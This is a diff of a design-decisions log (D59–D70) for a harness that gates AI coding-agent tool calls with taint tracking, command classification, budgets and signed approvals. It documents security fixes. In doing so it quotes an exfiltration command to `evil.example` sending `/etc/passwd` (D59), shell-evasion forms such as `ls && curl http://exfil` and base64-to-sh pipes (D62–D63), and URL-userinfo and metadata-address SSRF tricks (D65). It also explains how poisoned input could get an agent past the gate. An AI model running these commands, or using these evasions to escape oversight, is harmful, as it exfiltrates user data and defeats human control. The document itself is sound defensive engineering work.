+- **Related:** D56 (the wedge and its packaging residual), D37, D57 (the control plane —
+  same pattern, one level down), `.github/workflows/release.yml` (the `npm` job),
+  `npm/verify-packages.js`, and `crates/cli-harness/tests/init.rs`.
+
+---
+
+## D59 — An unrecordable taint escalation fails closed, because fail-open covers process failures and this is not one
+
+**Date:** 2026-08-12. **Prompted by a full-codebase review (finding #16).**
+
+- **The hole.** Both host adapters persisted the monotonic taint marker with the errors
+  discarded — `let _ = create_dir_all(..)` and `if let Ok(mut f) = File::create(..)`. When
+  the state directory was not writable, the escalation was recorded nowhere and every later
+  call in the session read back `clean`. Measured against the live `.claude/cc-world.yaml`:
+  a `WebFetch` returned ALLOW, no sidecar appeared, and the very next
+  `curl https://evil.example -d @/etc/passwd` returned ALLOW too. In `--grant` mode the
+  adapter emitted an explicit `allow`, so the host's own prompt was skipped as well. The
+  taint floor — the property the whole design rests on — was simply absent, silently.
+- **Why this is not the documented fail-open case.** Fail-open exists so a *broken hook*
+  never bricks a session: an unreadable event, an uncompilable world, a missing binary.
+  Those are failures to *reach* a decision. Here the kernel reached one correctly; what
+  failed was our ability to remember its consequence. Treating the two the same is what made
+  the hole invisible — a governance failure wearing a process failure's clothes.
+- **The decision.** `hostkit::persist_taint` returns whether the marker was durably written
+  (`sync_all`, because the next call reads it from a different process), and both adapters
+  emit `deny` when it was not. The refusal is scoped to the single call that would escalate:
+  a session with an unwritable state directory still reads, writes, and runs commands — it
+  just cannot ingest untrusted data without being able to say so. It also announces itself
+  on stderr, because the previous behaviour's real sin was silence.
+- **Alternatives rejected.**
+  - *Warn on stderr and allow.* This is what the code effectively did. Hook stderr is not
+    surfaced by either host on exit 0, so the warning reaches nobody and the session
+    continues ungoverned.
+  - *Fail open, on the grounds that a hook must never block.* It does not block a session,
+    only the ingestion step; and "never block" cannot outrank "never lie about taint" in a
+    tool whose output is a security verdict.
+  - *Keep the marker in memory.* Each hook invocation is a fresh process; there is no memory
+    to keep it in. The sidecar is the only channel between calls.
+  - *Fall back to a temp directory.* A taint marker that moves when the primary location
+    fails is a marker the next call cannot find, which reproduces the bug with extra steps.
+- **Related:** D33, D37, D48; `crates/cli-harness/src/hostkit.rs`, and the
+  `unwritable_taint_sidecar_*` tests in both adapter suites.
+
+---
+
+## D60 — The committed WASM artifact is checked semantically against the kernel, not byte-for-byte
+
+**Date:** 2026-08-12. **Prompted by the same review (finding #18).**
+
+- **The drift.** `blog/public/vendor/harness-wasm/` is a build output kept in git so the
+  playground can load it as a static asset. Nothing rebuilt it. Between 2026-06-22 and
+  2026-08-12 it fell nine preview-affecting commits behind — the entire `roots` feature and
+  D36 command classification among them — while reporting `version() == "0.0.1"` and every
+  CI job stayed green. AGENTS.md had stated the no-drift invariant the whole time. An
+  invariant nothing checks is a wish.
+- **What the drift actually cost.** Less than it first appears, and the distinction matters:
+  the WASM surface exports `preview`, `default_world`, and `version` — not `gate`. So the
+  playground was never running an exploitable pre-fix gate; it was *misdescribing* the
+  current kernel's decisions to anyone evaluating the project in a browser. A fidelity
+  failure, not an exposed vulnerability. Worth fixing on both counts.
+- **The decision.** `scripts/check-wasm-freshness.mjs` loads the committed artifact *and* a
+  freshly built one and requires them to answer identically: same `version()`, same bundled
+  `default_world()`, same `preview()` over a case set that deliberately includes a `roots`
+  world and a `command_classes` world — the two features whose absence went unnoticed. The
+  `wasm` CI job builds from source and runs it.
+- **Alternatives rejected.**
+  - *Byte-compare the committed artifact against a fresh build.* The obvious check, and it
+    would go red every time `dtolnay/rust-toolchain@stable` or wasm-pack changed codegen.
+    That is drift in the build, not in the kernel, and a check that cries wolf gets deleted.
+  - *Compare only `version()`.* It would have caught this instance (0.0.1 vs 0.2.1) and
+    nothing else: a rebuild within one version window is exactly when drift is hardest to
+    see. The preview cases are what give the check teeth — verified by diffing the stale
+    artifact against the current one on the `command_classes` case.
+  - *Stop committing the artifact and build it in the blog pipeline.* Defensible, and a
+    larger change than this finding warrants: it puts a Rust and wasm-pack toolchain in the
+    blog's build path. Revisit if the blog ever needs the engine at more than one version.
+  - *Install wasm-pack in CI via a third-party action.* This project reviews other people's
+    supply chains; it should not add an unpinned action to a workflow to save ninety
+    seconds. `cargo install wasm-pack --locked`.
+- **Related:** D22 (one engine, no reimplementation), E14; `.github/workflows/ci.yml` (the
+  `wasm` job), `scripts/check-wasm-freshness.mjs`.
+
+---
+
+## D61 — Every entry point resolves manifest roots, and the shared case set proves it
+
+**Date:** 2026-08-13. **Completes D46/D59's path-scope story; prompted by finding #15.**
+
+- **The gap the fix left behind.** D59 fixed `agy-hook` to canonicalize manifest roots the
+  way `cc-hook` already did. What it did not fix is *why nobody noticed for as long as
+  roots have existed*: `docs/demos/one-kernel/cases.yaml` had no path cases. The suite whose
+  entire job is to prove the hosts agree never exercised the one feature where they
+  disagreed. A parity harness only covers what you feed it, and this one was starved.
+- **A second world, not roots bolted onto the first.** Enabling `roots` on
+  `demo-world.yaml` changes the verdict of every path-shaped action arriving without a
+  resolved target — its existing `read` case correctly becomes `missing_path` DENY, and the
+  shell demo that asserts the old output breaks. One world cannot hold both stories, so
+  path-scope gets `roots-world.yaml` + `roots-cases.yaml` and its own two parity tests.
+- **The fixture is real and one rule is deliberately not canonical.** `{project}` is
+  substituted with an actual temp directory containing actual files, because root policy is
+  decided after canonicalization through the filesystem and a fixture of imaginary paths
+  pins imaginary behaviour. One rule points at `{project}/link`, a symlink to
+  `{project}/private`. That rule is the regression anchor: an entry point that resolves the
+  action path but leaves the root lexical stops matching it, and its `Deny` degrades to the
+  policy `default`. Verified by reverting each fix in turn — the adapter test fails with
+  `path_scope_ask` where it expects `deny`, and the wire-ABI test fails on `manifest_hash`.
+- **`harness gate` had the same hole (finding #26), so it is fixed here too.** It compiled
+  the manifest itself and never resolved roots, so a caller of the documented wire ABI had
+  nowhere to do it — relative rules, `~` rules and symlinked rules all silently stopped
+  binding. It now performs the same resolve-then-canonicalize step as the two hooks. The
+  kernel stays pure; this is the adapter half of the boundary, and it must not differ per
+  entry point.
+- **Schemas and cross-host portability are currently exclusive (finding #27).** The
+  adapters alias host argument keys into the neutral vocabulary by *adding* keys
+  (`AbsolutePath` → `path`, `CommandLine` → `command`), and schema validation rejects
+  properties a schema does not declare — so an Antigravity call against a schema-bearing
+  action returns `schema_violation` no matter how well-formed it is. `.agents/agy-world.yaml`
+  already declares no schemas; `roots-world.yaml` matches, with the reason written down
+  rather than left as folklore. Reconciling the two properly (alias-aware validation, or
+  declaring the host keys) is open.
+- **Alternatives rejected.**
+  - *Add roots to `demo-world.yaml`.* Breaks the existing case set and the shell demo, for
+    the reason above.
+  - *Hardcode absolute fixture paths like `/etc` and `/etc/shadow`.* `/etc` is a symlink on
+    macOS, so the fixture would itself be the thing under test. A generated temp tree is the
+    only portable way to control canonicality.
+  - *Make every root canonical so the world needs no resolution.* The test would pass on
+    every entry point including the broken ones, which is precisely the failure being
+    corrected.
+  - *Expose `hostkit` as a library so the in-process leg can call it.* A crate-structure
+    change to serve one test; the six-line stand-in is labelled as such instead.
+- **Related:** D46, D48, D59; `docs/demos/one-kernel/roots-world.yaml`,
+  `docs/demos/one-kernel/roots-cases.yaml`, and the two `*_path_scope` tests in
+  `crates/cli-harness/tests/one_kernel.rs`.
+
+---
+
+## D62 — A command classifier without a catch-all is a compile error, not an author's choice
+
+**Date:** 2026-08-14. **Closes findings #19 and #20.**
+
+- **What the classifier actually buys.** `command_classes` matches patterns against a shell
+  command line, and that is a heuristic: `"curl" http://x`, `curl$IFS'...'` and
+  `echo <base64> | base64 -d | sh` all evade the pattern lists, by construction and forever.
+  The security property was never "the patterns catch everything". It is **where an unmatched
+  command lands** — `default_to`, which every shipped manifest points at an
+  approval-required, network-effectful class. Evasion downgrades into the stricter bucket.
+- **Which made the field's optionality the real hole.** Omit `default_to` and an unmatched
+  command falls back to the *raw* action — for a `bash`-shaped action, typically ambient
+  `Process`, which no transition policy denies. Measured: a world declaring classifiers with no
+  `default_to` compiles clean, denies `curl http://x` in a tainted session, and **allows**
+  `python3 -c 'import socket…'` in the same session. The safety of the whole mechanism rested
+  on a field the schema treated as decoration.
+- **Also: one classifier per action.** `classify_command` resolves with `.find()`, so a second
+  entry for the same action silently never runs — and splitting a long pattern list across two
+  blocks is exactly how an author would reach for that. Channels and base actions were already
+  duplicate-checked; classifiers were the gap in the same family.
+- **The decision.** `validate()` now rejects both. The `default_to` check runs *last* in the
+  per-classifier pass, so a manifest with several problems still reports the more specific one
+  first.
+- **Alternatives rejected.**
+  - *Default `default_to` to the most restrictive declared class.* Silently correct, and it
+    guesses. "Most restrictive" is a judgement about the author's ontology that the compiler
+    should not be making on their behalf, and a manifest that reads as permissive while
+    behaving otherwise is its own hazard.
+  - *Warn instead of erroring.* Warnings on a governance manifest get read once. The failure
+    mode being prevented is arbitrary shell in a tainted session.
+  - *Leave it and document the requirement.* This is the third finding in this family where
+    prose stated an invariant nothing enforced (see D60, D61). Documentation was already
+    available and had not helped.
+  - *Accept the breaking change quietly.* It is breaking for any third-party manifest that
+    omitted the field — those manifests are exactly the vulnerable ones, and the error text
+    names the field and explains the consequence.
+- **Related:** D36 (kernel-side classification), D44; finding #17 (class *ordering* is a
+  separate hazard in the same surface and remains open);
+  `crates/compiler/src/loader.rs`.
+
+---
+
+## D63 — A command claimed by two classes is ambiguous, and ambiguity fails closed
+
+**Date:** 2026-08-14. **Closes finding #17; completes the classifier hardening begun in D62.**
+
+- **The hole.** `classify_command` returned the **first** class whose patterns matched, so
+  declaration order decided a security verdict. A world listing a permissive class before a
+  restrictive one classified `ls && curl http://exfil` by its `ls` prefix: measured in a fully
+  tainted session, bare `curl http://exfil` was DENY while `ls && curl http://exfil` was
+  **ALLOW**. Prefixing `ls &&` bypassed the taint floor.
+- **Latent, but the language invited it.** All shipped manifests order network-first with no
+  permissive class, so none was vulnerable. But "list my safe commands first" is the natural
+  authoring instinct, nothing documented that ordering carried security weight, and nothing
+  validated it. The kernel's own test asserted `ls && curl` classifies as network — true only
+  because that fixture happens to have no earlier-matching class. The suite encoded the safe
+  ordering without ever stating the rule.
+- **The decision.** Every class is evaluated. Exactly one matching target resolves to it; none
+  resolves to `default_to`; **two or more different targets resolve to `default_to`**. A command
+  line that looks like two different things is two different things, and the honest answer is
+  the classifier's own fail-closed bucket rather than whichever entry the author typed first.
+  Several classes pointing at the *same* target is not ambiguity — otherwise splitting a long
+  pattern list for readability would silently fail closed.
+- **D62 is what made this possible.** Ambiguity needs somewhere safe to go, and `default_to` is
+  now mandatory. The two findings fix each other: without the catch-all requirement, "fail
+  closed on ambiguity" would have meant falling back to the raw action — ambient `Process`,
+  outside the taint floor — which is the very hole D62 closed.
+- **Alternatives rejected.**
+  - *Evaluate all classes and pick the most restrictive match.* The obvious answer, and it
+    requires a severity ordering over `SideEffectClass` that does not exist. `SideEffectClass`
+    derives `Ord`, but from **declaration order** — ranking by it would encode policy in enum
+    layout, silently, and change meaning whenever a variant is inserted. Inventing a severity
+    table is exactly the kind of judgement about the author's ontology that D62 declined to make.
+  - *Reject at compile time when a lower-severity class precedes a higher-severity one.* Same
+    missing severity ordering, plus pattern overlap is undecidable in general, so the check
+    would be both unprincipled and incomplete.
+  - *Document that ordering is security-critical and leave the behaviour.* The fourth finding in
+    this family where prose stated an invariant nothing enforced. Documentation was available
+    and had not helped.
+  - *Keep first-match-wins but warn on overlap at compile time.* Overlap is a property of
+    command strings, not patterns; `ls ` and `curl ` do not overlap as patterns while
+    `ls && curl` matches both.
+- **A limitation found while shipping it.** The WASM freshness check (D60) did **not** catch the
+  resulting artifact staleness: `classify_command` is not reachable through the exported
+  `preview()` surface, so the semantic comparison saw no difference. An mtime anchor against the
+  engine's sources now runs first — the version anchor added at 0.2.2 only moves at release, so
+  within a release window a stale reference build still compared vacuously. Belt and braces:
+  mtime catches "you did not rebuild", the semantic cases catch "the rebuild changed answers".
+- **Related:** D36, D44, D62; `crates/harness-types/src/compiled.rs`,
+  `crates/harness-preview/src/gate.rs` (golden vectors).
+
+---
+
+## D64 — Budget counters are carried session state, and a world that counts calls requires them
+
+**Date:** 2026-08-14. **Closes the Codex-scan finding "runtime budget counters are reset at gate
+and agent decision boundaries".**
+
+- **The hole.** `Budget` and `budget_exceeded` were complete and correct; nothing ever supplied
+  them a non-zero `BudgetUsage`. `gate()` and the agent orchestrator both constructed
+  `BudgetUsage::default()` per decision, so every call was evaluated as the session's first.
+  `max_commands_per_task`, `max_network_calls`, `max_file_writes` and
+  `max_tokens_per_session` were decorative in every manifest that declared them — including
+  all three live ones.
+- **The decision: budgets are carried exactly like taint.** The kernel is pure and each hook
+  invocation is a separate process, so counters travel in `GateContext.usage`, come back
+  charged in `GateResponseContext.usage`, and the adapter persists them in a `usage-<session>`
+  sidecar beside the taint marker. The mcp-gateway is one long-lived process and keeps them in
+  memory; the orchestrator owns a live session and threads a `&mut BudgetUsage` next to its
+  existing `&mut Taint`.
+- **Charging lives beside the limit.** `charge()` sits immediately above `budget_exceeded()` in
+  `disposition.rs` and mirrors its categories. A limit whose charge lands in a different bucket
+  is a limit that never binds, and the only defence against that drift is adjacency plus a test.
+  Only an ALLOW that will actually run is charged — a refusal must not push a session toward
+  its limit.
+- **Omission fails closed, scoped to worlds that count.** `missing_usage` mirrors
+  `missing_path`: a control a thin adapter can disable by leaving a field out is not a control.
+  It fires only when the manifest declares a *counted* limit; `command_timeout_ms` bounds one
+  execution and is enforced by the executor, so it does not oblige a caller to carry counters.
+  Unreadable or corrupt counters fail closed for the same reason, and unpersistable ones refuse
+  the call they would have charged (D59's rule, applied to budgets).
+- **Breaking for the wire ABI, deliberately, without a version bump.** Requiring `usage` under a
+  counted budget is the fourth fail-closed hardening of v1, after `taint`, `source_channel` and
+  `path`. Bumping `v` would let a caller pin v1 and keep running ungoverned, which is the
+  condition being removed.
+- **Alternatives rejected.**
+  - *Default missing usage to zero.* Preserves compatibility and preserves the finding: any
+    caller that omits the field gets an unlimited session, silently.
+  - *Accumulate counters inside the kernel.* Would make `evaluate` stateful and destroy the
+    property the whole design rests on — a pure, replayable decision function.
+  - *Track usage in the trace store and read it back at decision time.* Gives the kernel I/O by
+    another route, and makes a verdict depend on a store that may be absent, remote, or slow.
+  - *Charge on the ASK, not on the execution.* An approval the human declines would consume
+    budget, so repeatedly declining would exhaust the session.
+- **Known limit, unchanged by this.** An over-budget verdict is `REPLAN`, and neither Claude
+  Code nor Antigravity has a "propose a smaller step" channel, so the adapters fall through to
+  the host's own permission flow rather than denying. In replace mode that means the human is
+  prompted rather than silently allowed. Tokens are still never charged at the gate — only a
+  caller that has seen a model response can count them.
+- **Related:** D24 (the gate ABI), D59 (persist-or-refuse), D46/D61 (`missing_path`, the same
+  shape); `crates/world-kernel/src/disposition.rs`, `docs/harness-gate-abi.md` §3/§4/§6.
+
+---
+
+## D65 — The web handler enforces its own egress policy; the command handler still cannot
+
+**Date:** 2026-08-14. **Closes findings #11 and #12.**
+
+- **#12: `WebHandler` ignored the spec's `NetworkPolicy`.** A spec built with
+  `NetworkPolicy::Disabled` still made the request. The asymmetry with `CommandHandler` is the
+  whole point: a subprocess opens its own sockets and the handler cannot police them, so D47
+  makes it fail closed. The web handler *is* the thing performing the egress, so it can enforce
+  the policy — and now does. `Disabled` refuses; `AllowHosts` matches the URL's real host.
+- **The URL parser is hand-rolled, deliberately.** A security decision keyed on "the host" must
+  make visible what it thinks the host is. The bypass that matters is **userinfo**:
+  `https://docs.example@evil.example/` has host `evil.example`, and any check that asks whether
+  the URL *contains* an allowed host reads it as allowed. Userinfo is split at the **last** `@`,
+  IPv6 literals are unbracketed, trailing dots and case are normalised, and each of those has a
+  test.
+- **Loopback, link-local and private ranges need naming explicitly.** An allowlist entry may
+  name `127.0.0.1` — a local dev server is a legitimate target — but a broad or suffix entry
+  must not silently reach `169.254.169.254`. This is SSRF hygiene, not policy invention.
+- **The finding's second half: the policy is never configured.** `ExecEnv.network` defaults to
+  `Disabled` and *nothing in the codebase sets it to anything else*, so enforcing it correctly
+  turns web fetch off until a caller grants egress. That is the right default and it is worth
+  stating plainly: before this change the field was inert, so nobody noticed it was unset. The
+  manifest has no vocabulary for an egress allowlist yet — the caller must supply `ExecEnv`.
+  Blast radius is the in-process agent loop (demos and tests), not the deployed hook adapters,
+  which are decision-only and never execute.
+- **#11: a timed-out command left its descendants running.** `child.kill()` signals the direct
+  child only, so `sleep 300 &` survived its parent's timeout. Worse, a surviving descendant
+  inherits the stdout/stderr pipes, so the reader threads never saw EOF and `out_reader.join()`
+  could block **forever** — the timeout path, whose entire job is to bound a command, could
+  hang the executor instead. Measured: the two regression tests take 31.8s and fail without the
+  fix, 2.0s and pass with it.
+- **The child gets its own process group and the group is killed.** `SIGKILL` rather than
+  `SIGTERM`: this path has already waited out the command's whole timeout budget, so there is
+  no grace period left to offer.
+- **`nix` rather than `libc`, to keep the workspace free of `unsafe`.** `killpg` via raw `libc`
+  would be three lines and one `unsafe` block; it would also be the first `unsafe` in 20k lines
+  of a security tool. The safe wrapper costs a dependency and keeps the property.
+- **Windows is not fixed and says so.** Bounding a process tree there needs a Job Object the
+  executor does not create, so a timed-out command may still leave descendants. Stated in the
+  code rather than left for someone to discover.
+- **Alternatives rejected.**
+  - *Pull in a URL crate for parsing.* Reasonable, and it hides the userinfo rule behind a
+    dependency in the one place a reviewer most needs to see it.
+  - *Denylist known-bad hosts instead of an allowlist.* The policy type is already an allowlist;
+    a denylist would invert the failure direction to open.
+  - *`SIGTERM` then `SIGKILL` after a grace period.* Doubles the worst-case time on a path that
+    exists to enforce an upper bound the command has already blown through.
+- **Related:** D47 (the command handler's fail-closed), finding #10;
+  `crates/executor/src/handlers/{web,command}.rs`.
+
+---
+
+## D66 — The audit log scans values for secrets, and refuses to guess
+
+**Date:** 2026-08-14. **Closes finding #17.**
+
+- **The hole.** Redaction matched a field's **key** or dotted path against the manifest's
+  `observability.redact` patterns. Every secret that arrives inside an ordinary value had no
+  matching key and went to the trace verbatim: a bearer token in `command`, an `api_key` in a
+  `url`, a password in a `git clone` URL, a private key echoed into a file.
+- **Why the obvious fix is wrong.** Adding `command`, `url` and `body` to the default redact
+  patterns would mask the whole value. A trace in which every command reads `[REDACTED]` is not
+  an audit log; it is a log that something happened. The value has to survive and the secret
+  inside it has to go, which means scanning the string and masking only the offending span.
+- **The detectors are few, and that is the design.** Each is either an issuer-defined shape
+  (`ghp_`, `github_pat_`, `AKIA`/`ASIA`, `AIza`, `sk-`/`sk-ant-`, `xox*-`, `glpat-`, `npm_`, a
+  JWT header segment, a PEM private-key envelope) or a syntactic position that is a secret by
+  definition (an `Authorization`/`Cookie` header value, `?token=`, the password half of URL
+  userinfo). High-entropy heuristics and bare hex runs are excluded.
+- **Because a redactor that guesses fails twice.** It corrupts the audit record, and it teaches
+  the reader that `[REDACTED]` is noise. A test asserts the negative case explicitly — ordinary
+  commands, `task-force`, `?page=2`, `my_secret=` outside a query position all pass through
+  byte-identical.
+- **A safety net, not a replacement.** Naming your secrets in `observability.redact` is still
+  better than hoping a scanner recognises them; this catches what the manifest did not name.
+- **Alternatives rejected.**
+  - *Add `command`/`url`/`body` to the default patterns.* Destroys the audit value of exactly
+    the fields an auditor most needs.
+  - *Entropy scoring over every string.* Flags base64 payloads, hashes, UUIDs and minified
+    code; the false-positive rate is the failure mode.
+  - *A regex engine.* Not in the offline crate set, and for a security control that must be
+    read and trusted, an explicit scanner is easier to audit than a pattern table.
+  - *Mask at write time in the store only.* Redaction belongs on the value before it reaches
+    any sink, including bundles and replay.
+- **Related:** E4.2, invariant 15; `crates/trace-store/src/{secrets,redact}.rs`.
+
+---
+
+## D67 — The approval log is signed, and an approval is bound to the policy that granted it
+
+**Date:** 2026-08-14. **Closes the last P2 of the security sweep.**
+
+- **The hole.** The approval store is append-only JSONL, and it is the one file in this system
+  whose contents *grant* something. Anything able to write it could append a token already in
+  the `Approved` state and manufacture a human decision that never happened; `load` folded it
+  into the token set without a murmur. Separately, an approval bound to `world_id` but not to
+  the compiled manifest survived a rewrite of the very rules it was granted under — a world
+  keeps its id while its policy changes completely.
+- **Every line carries an HMAC-SHA256**, keyed by a 32-byte secret read from `/dev/urandom` on
+  first use and kept beside the log at `0600`, opened `O_NOFOLLOW`, with mode and ownership
+  re-checked on every open. Forging a grant now requires the key rather than merely write
+  access.
+- **A line that does not verify fails the whole load, rather than being skipped.** A store that
+  has been modified by something without the key is not a store to keep answering from, and the
+  failure direction is safe: no approvals means the human is asked again. There is deliberately
+  no lenient path for an unsigned line either — from the verifier's side, "unsigned" and
+  "forged" are the same thing.
+- **HMAC is implemented here rather than imported.** The offline crate set has `sha2` and not
+  `hmac`. It is RFC 2104 in about twenty lines, checked against three RFC 4231 known-answer
+  vectors including the longer-than-block-size key that exercises the digest branch. A
+  hand-rolled MAC without known-answer tests would be worse than no MAC, because it would look
+  like protection. MAC comparison is constant-time; a `==` on the hex would turn forgery into
+  32 cheap searches.
+- **`manifest_hash` joins the binding.** `world_id` says *which* world, `manifest_hash` says
+  *which version of it*, and an approval now dies when either moves.
+- **Location beats cryptography, and the code now says so.** The CLI keeps the store in a
+  tempdir; a comment proposed moving it to `.agents/` in a deployed tool, which is inside the
+  project being governed and therefore exactly wrong. Same mistake as D58 (the kernel inside
+  `node_modules`) and D57 (the control plane): anything the enforcement depends on must live
+  outside what it enforces upon. The MAC is what remains true when that assumption fails.
+- **Alternatives rejected.**
+  - *Rely on filesystem permissions alone.* They are the primary defence and they are exactly
+    what fails in the scenario the finding describes — a store reachable by the governed
+    project.
+  - *Sign the whole file rather than each line.* Breaks append-only writing: every append would
+    rewrite and re-sign the log, and a crash mid-write would void every past approval.
+  - *A hash chain instead of a MAC.* Detects reordering and truncation but not appending, since
+    anyone can continue an unkeyed chain. Appending is the attack.
+  - *Derive the key from a passphrase or machine id.* A machine id is not a secret, and a
+    passphrase prompt in a hook that must run non-interactively is a non-starter.
+  - *Skip bad lines and carry on.* Turns a detected forgery attempt into a silent partial load.
+- **Known limits.** The key sits beside the log, so an attacker with read access to that
+  directory can forge freely — the MAC defends against write-without-read, which is the
+  realistic case for a governed project directory, not against full compromise. Windows ACLs
+  are not checked; only the MAC binds there. And `/dev/urandom` is the only CSPRNG wired up, so
+  non-unix platforms refuse to create a store rather than invent a weak key.
+- **Related:** D57, D58 (the same "outside what it enforces upon" rule), E6.2–E6.4;
+  `crates/trace-store/src/{integrity,approval}.rs`.
+
+---
+
+## D68 — Adapters rename host arguments into the manifest's vocabulary; they do not add to it
+
+**Date:** 2026-08-14. **Closes finding #23/#27.**
+
+- **The hole.** `alias_neutral_args` mapped Antigravity's PascalCase keys onto the neutral ones
+  by *adding* the neutral key and keeping the host spelling, on the reasoning that an audit
+  record might reference the original. Object schemas are closed by default (an undeclared
+  argument is rejected), so the adapter was injecting a second key the manifest author never
+  wrote and could not anticipate. Any action with a `schema` therefore returned
+  `schema_violation` on that host no matter how well-formed the call was — schemas and
+  cross-host portability were mutually exclusive, and nothing said so.
+- **The decision.** Rename. The host's spelling is a transport detail; the call, expressed in
+  the manifest's vocabulary, has one name for one argument. The kernel never needed the host
+  copy: the classifier reads `arguments[arg]` and the resolved path travels out-of-band in
+  `GateRequest.path`, so nothing downstream was consuming the original.
+- **What deliberately did not change.** A host argument the manifest does not declare still
+  fails a closed schema. That is the security property, not collateral damage: an undeclared
+  argument is input the kernel was never asked to judge, and quietly dropping it would mean
+  deciding on a call different from the one that executes. `additionalProperties: true` is the
+  explicit way to say you accept unjudged extras. Both halves are pinned by tests.
+- **Alternatives rejected.**
+  - *Teach the kernel which host keys to ignore.* Puts Antigravity's vocabulary inside the pure
+    kernel, which is the thing the adapter layer exists to prevent.
+  - *Strip undeclared arguments in the adapter so closed schemas always pass.* Makes the kernel
+    judge a call that differs from the one the host runs — a governance gap dressed as
+    convenience, and strictly worse than a refusal.
+  - *Default schemas to `additionalProperties: true`.* Inverts a fail-closed default across
+    every world to fix one host's spelling.
+  - *Document it and move on.* That was the state being fixed; the constraint was undocumented
+    folklore, discoverable only by hitting `schema_violation` on exactly one host.
+- **Residual worth knowing.** The neutral vocabulary has three path spellings (`path`,
+  `file_path`, `notebook_path`), so a schema written against one does not match an adapter that
+  normalises to another. Narrowing that is a separate change to the neutral vocabulary itself.
+- **Related:** D36, D48, D61; `crates/cli-harness/src/agy_hook.rs`,
+  `crates/world-kernel/src/schema.rs`.
+
+---
+
+## D69 — The source channel is declared by the operator, because no host will tell us
+
+**Date:** 2026-08-14. **Closes finding #22/#21.**
+
+- **The complaint was fair.** Both live adapters hardcoded `source_channel: "user_prompt"`, the
+  most-trusted channel, for every call — including one the model proposed immediately after
+  reading a poisoned file. The gate has careful machinery here (`parse_channel` fails closed on
+  an unknown channel, with a comment about thin adapters not upgrading an unknown proposer),
+  and both real hosts bypassed all of it with a constant.
+- **It cannot be derived, and that is a fact about the hosts rather than a shortcut.** A Claude
+  Code PreToolUse event carries `tool_name`, `tool_input`, `session_id`, `cwd`,
+  `permission_mode`. An Antigravity one carries `toolCall`, `modelName`, `stepIdx`,
+  `workspacePaths`, `transcriptPath`. Both describe *what is about to run*; neither says who
+  asked for it. An adapter that claimed to know would be guessing, and a guess that upgrades
+  trust is the worst possible direction to guess in.
+- **So it is declared.** Both adapters take `--source-channel`, defaulting to `user_prompt` so
+  nothing changes for an existing install. Its value is that an unattended or background
+  session can be run at a lower trust: measured against the live `.claude/cc-world.yaml`, a
+  `Write` is `allow` under the default and **ABSENT** under `--source-channel web_fetch`, while
+  a `Read` still passes — the capability matrix shrinking exactly as the manifest says it
+  should. An undeclared channel still fails closed.
+- **What this does not pretend to be.** With the default left alone, channel trust does no
+  work. The control that actually catches "the model read something poisoned and then tried to
+  send it somewhere" is data-flow taint, which is enforced regardless of this field. Saying so
+  is better than the previous state, where the code implied a control that was inert.
+- **Alternatives rejected.**
+  - *Infer the proposer from the transcript* (both hosts do provide a path to it). It means
+    parsing an undocumented, host-internal format, doing file I/O on the hook's hot path, and
+    re-deriving a guess every call — to produce something the host could simply have told us.
+    If a host ever reports the proposer, deriving becomes a two-line change.
+  - *Default to a lower-trust channel.* Honest-looking and immediately wrong: it would silently
+    remove capabilities from every existing install, and "the model proposed it" is true of
+    every call in a hook-based integration, so the label conveys nothing while the capability
+    loss is real.
+  - *Use `stepIdx` as a proxy* (step 0 ≈ closest to the user's request). A heuristic dressed as
+    provenance, and trivially wrong for a multi-step task the user explicitly asked for.
+  - *Remove `source_channel` from the ABI.* The in-process orchestrator does know real
+    provenance per perception, and the field is doing genuine work there.
+- **Related:** D24 (the gate ABI), D37, D48; `crates/cli-harness/src/{cc_hook,agy_hook}.rs`.
+
+## D70 — The publish path is rehearsed on every pull request, from a shared script
+
+**Context.** `release.yml` runs only on a tag. Everything after the compile — the artifact
+round-trip, unpacking four archives, filling the platform packages, packing the tarballs — sits
+behind `if: startsWith(github.ref, 'refs/tags/')` and therefore executes for the first time on a
+tag push, inside the job that publishes to npm. An npm version cannot be republished, so first
+contact with a bug happens at the one point in the pipeline that has no undo.
+
+That path had already produced two incidents, both caught by a human dry-running steps by hand
+rather than by anything in the repository: GNU tar cannot read a zip (the Windows package would
+have shipped empty), and `v0.3.1` went out as two platforms of four. A third was latent — see
+below.
+
+The proximate trigger was Dependabot. `actions/upload-artifact` and `actions/download-artifact`
+appear **only** in `release.yml`, so the PRs bumping them across major versions arrived carrying a
+complete set of green checks that could not, even in principle, have failed. Merging on green
+would have been the exact mistake `blog/…/every-check-was-green` is about, in the week it was
+published.
+
+**Decision.** The assembly step becomes `scripts/assemble-npm-packages.sh`, called by both
+`release.yml` and a new `release-dry-run` job in `ci.yml`. The CI job builds one real binary,
+produces all four archives in the release's layout and names, uploads them as four separate
+artifacts, **deletes the local copies**, downloads them back with `merge-multiple: true`, and then
+runs the release's own steps in order. Deleting before the download is the load-bearing detail: it
+is what makes the round-trip the thing under test rather than a formality.
+
+A second guard, `scripts/check-npm-pack.mjs`, asserts that the tarballs npm *would* publish
+actually contain their payload.
+
+**The shared script is the decision, not an implementation detail.** A copied step would drift
+from the one it rehearses, and a check that has drifted from the thing it checks is this
+repository's most reliable failure mode — the rotted demos, the stale WASM, three tests asserting
+a vulnerability. The rehearsal must be the performance.
+
+**What it caught immediately, which is the argument for it.** Deleting the `files` allowlist from
+a platform `package.json` — a plausible tidy-up — makes npm fall back to `.gitignore`, which
+ignores `harness` and `LICENSE-*` because they are build outputs. The package then publishes
+successfully, installs successfully, and has no binary. `npm/verify-packages.js` reports
+**"npm layout OK"**. Verified by doing it: the existing guard passed, `check-npm-pack.mjs` failed
+with "would publish WITHOUT harness".
+
+- **Alternatives rejected.**
+  - *`npm publish --dry-run` in CI.* Tried first, and it does not do what its name suggests: it
+    contacts the registry and fails with "cannot publish over the previously published versions"
+    at any version already on npm — which is every commit between releases. It would have been a
+    permanently red job. `npm pack --dry-run` is local and covers the tarball contents, which is
+    the whole delta. Recorded in the workflow so it is not helpfully re-added.
+  - *Build all four targets in CI.* Three extra runners, including macOS and Windows, on every
+    pull request, to test packaging rather than compilation. One real binary in four archives
+    exercises the same code; `check` and `cross` own the compiler.
+  - *Rely on `workflow_dispatch` against `release.yml`.* It exercises the build job only — the
+    `npm` job is tag-gated too — and it requires someone to remember. A check nobody runs is the
+    problem, not the solution.
+  - *A draft GitHub release to exercise `softprops/action-gh-release`.* Rejected as the wrong
+    trade: it creates real, visible releases on every pull request. **That action therefore stays
+    unrehearsed, and this is a known residual** — it is the only step of the publish path this job
+    does not cover.
+- **Related:** D56, D58 (the npm layout this protects); `scripts/assemble-npm-packages.sh`,
+  `scripts/check-npm-pack.mjs`, `.github/workflows/{ci,release}.yml`.
+
